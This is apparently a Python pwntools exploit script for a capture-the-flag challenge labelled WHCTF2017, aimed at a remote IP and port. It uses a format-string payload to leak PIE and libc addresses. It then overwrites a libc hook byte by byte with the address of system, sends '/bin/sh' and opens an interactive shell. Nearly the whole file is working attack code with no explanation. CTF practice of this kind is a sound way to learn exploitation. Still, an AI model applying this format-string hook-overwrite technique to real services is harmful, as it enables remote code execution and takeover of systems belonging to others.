from pwn import *
context(terminal = ["deepin-terminal", "-x", "sh", "-c"], arch = 'amd64')

LOCAL =1

VERBOSE = 1

DEBUG = 0



#16_04_magic = [0x45216,0x4526a,0xf02a4,0xf1147]

#18_04_magic = [0x4f2c5,0x4f322,0x10a38c]



if VERBOSE:
    context.log_level = 'debug'
if LOCAL:
    #t = process('./sgc',env={'LD_PRELOAD':'./libc-2.23.so'})
    t = remote('111.198.29.45', 54272)
    libc = ELF('libc.so.6')
    if DEBUG:
        gdb.attach(t)
else:
    t = remote('ip', 1337)
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))


def debug():
    raw_input()


def ru(data,drop=True):
    return t.recvuntil(data,drop=drop)

def rl():
    return t.recvline()

def ra():
    return t.recvall()

def r(l):
    return t.recv(l)

def sl(data):
    t.sendline(data)

def s(data):
    t.send(data)


def sla(data):
    t.sendlineafter(data)

def lj(data):
    return u64(data.ljust(8,'\x00'))


def sla(data,data0):
    t.sendlineafter(data,data0)

def sa(data,data0):
    t.sendafter(data,data0)


def vul(payload):
    sla('Code:\n', '1')
    sla('WHCTF2017:\n', payload)



payload = cyclic(1002) + '%397$p.%398$p'
debug()
vul(payload)
ru('\n')
addr_pie = int(ru('.'),16) - 0xda0
addr_libc = int(ru('\n'), 16) - 0xf0 - libc.symbols['__libc_start_main']
leak('addr_pie', addr_pie)
leak('addr_libc', addr_libc)
addr_sys = addr_libc + 0x45390

for i in range(8):
    sys = p64(addr_sys)
    payload = cyclic(1000) + 'ss'
    payload += '%' + str(ord(sys[i]) + 2) + 'c%133$hhn'
    payload = payload.ljust(1016,'A')
    payload += p64(addr_libc + 0x3c67a8 + i)
    payload = payload.ljust(1024,'a')
    vul(payload)


sl('2')
sl('/bin/sh\x00')

t.interactive()
